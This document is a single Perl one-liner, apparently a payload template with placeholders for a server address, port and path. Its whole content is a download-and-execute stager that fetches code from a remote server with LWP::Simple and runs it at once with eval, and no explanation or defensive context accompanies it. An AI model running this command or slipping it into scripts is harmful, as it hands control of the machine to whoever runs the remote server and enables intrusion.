perl -MLWP::Simple -e 'eval(get("http://{{SERVER_IP}}:{{SERVER_PORT}}/{{URI}}"));'
